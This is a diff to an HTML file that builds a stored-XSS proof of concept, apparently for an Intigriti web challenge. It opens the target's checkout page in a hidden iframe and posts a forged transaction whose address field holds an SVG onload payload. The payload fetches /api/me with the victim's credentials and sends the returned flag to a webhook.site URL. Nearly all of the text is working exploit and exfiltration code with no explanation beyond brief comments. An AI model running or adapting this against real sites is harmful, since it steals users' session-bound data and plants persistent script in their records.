@@ -1,12 +1,44 @@
 <!DOCTYPE html>
 <html>
 <body>
-<svg/onload="
+<script>
+/*
+  Stored-XSS seeding PoC
+  Uses admin bot to create a malicious transaction
+*/
+
+const XSS_PAYLOAD = `<svg/onload="
 fetch('/api/me',{credentials:'include'})
 .then(r=>r.json())
 .then(d=>{
- new Image().src='https://webhook.site/c35fd6f1-9633-44be-af95-cac50fa47840?flag='+encodeURIComponent(d.flag)
+  new Image().src=
+  'https://webhook.site/c35fd6f1-9633-44be-af95-cac50fa47840?flag='+
+  encodeURIComponent(d.flag)
 })
-">
+">`;
+
+// 1️⃣ Open checkout as admin (hidden iframe)
+const checkout = document.createElement("iframe");
+checkout.style.display = "none";
+checkout.src =
+  "https://challenge-0126.intigriti.io/checkout.html" +
+  "?currency=1337COIN&price=1";
+
+document.body.appendChild(checkout);
+
+// 2️⃣ Wait for checkout to load
+setTimeout(() => {
+  // 3️⃣ Send malicious transaction via postMessage
+  checkout.contentWindow.postMessage({
+    type: "submitTransaction",
+    transaction: {
+      // 🔥 Inject XSS into a stored field
+      toAddress: XSS_PAYLOAD,
+      currency: "1337COIN",
+      amount: 1
+    }
+  }, "*");
+}, 4000);
+</script>
 </body>
 </html>
